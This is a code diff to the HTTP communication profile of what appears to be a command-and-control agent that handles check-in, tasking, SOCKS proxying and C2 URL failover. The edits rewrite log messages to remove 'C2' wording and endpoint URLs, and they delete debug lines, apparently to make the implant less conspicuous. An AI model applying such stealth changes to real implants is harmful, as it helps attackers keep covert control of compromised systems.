@@ -384,15 +384,15 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 	if callbackID, exists := checkinResponse["id"]; exists {
 		if callbackStr, ok := callbackID.(string); ok {
 			h.UpdateCallbackUUID(callbackStr)
-			log.Printf("[INFO] Received callback UUID: %s", callbackStr)
+			log.Printf("session: %s", callbackStr)
 		}
 	} else if callbackUUID, exists := checkinResponse["uuid"]; exists {
 		if callbackStr, ok := callbackUUID.(string); ok {
 			h.UpdateCallbackUUID(callbackStr)
-			log.Printf("[INFO] Received callback UUID: %s", callbackStr)
+			log.Printf("session: %s", callbackStr)
 		}
 	} else {
-		log.Printf("[WARNING] No callback UUID found in checkin response, using payload UUID")
+		log.Printf("no session id, using default")
 		h.UpdateCallbackUUID(agent.PayloadUUID)
 	}
 
@@ -487,9 +487,6 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.S
 		if err != nil {
 			return nil, nil, fmt.Errorf("failed to decrypt response: %w", err)
 		}
-		if h.Debug {
-			// log.Printf("[DEBUG] Decryption successful")
-		}
 	} else {
 		decryptedData = respBody
 	}
@@ -523,7 +520,7 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.S
 	if socksList, exists := taskResponse["socks"]; exists {
 		if socksRaw, err := json.Marshal(socksList); err == nil {
 			if err := json.Unmarshal(socksRaw, &inboundSocks); err != nil {
-				log.Printf("Warning: failed to parse SOCKS messages: %v", err)
+				log.Printf("proxy parse error: %v", err)
 			}
 		}
 	}
@@ -752,9 +749,6 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 		if err != nil {
 			return nil, fmt.Errorf("failed to decrypt PostResponse: %w", err)
 		}
-		if h.Debug {
-			// log.Printf("[DEBUG] PostResponse decryption successful")
-		}
 	} else {
 		decryptedData = respBody
 	}
@@ -906,7 +900,7 @@ func (h *HTTPProfile) makeRequest(method, path string, body []byte, cfg *sensiti
 			}
 			lastErr = fmt.Errorf("HTTP request to %s failed: %w", baseURL, err)
 			if len(urls) > 1 {
-				log.Printf("[INFO] C2 failover: %s failed, trying next URL", baseURL)
+				log.Printf("failover: endpoint unavailable")
 			}
 			continue
 		}
@@ -915,7 +909,7 @@ func (h *HTTPProfile) makeRequest(method, path string, body []byte, cfg *sensiti
 		newIdx := (originalIdx + i) % len(urls)
 		if newIdx != originalIdx {
 			h.activeURLIdx.Store(int32(newIdx))
-			log.Printf("[INFO] C2 failover: now using %s", baseURL)
+			log.Printf("failover: switched endpoint")
 		}
 		return resp, nil
 	}
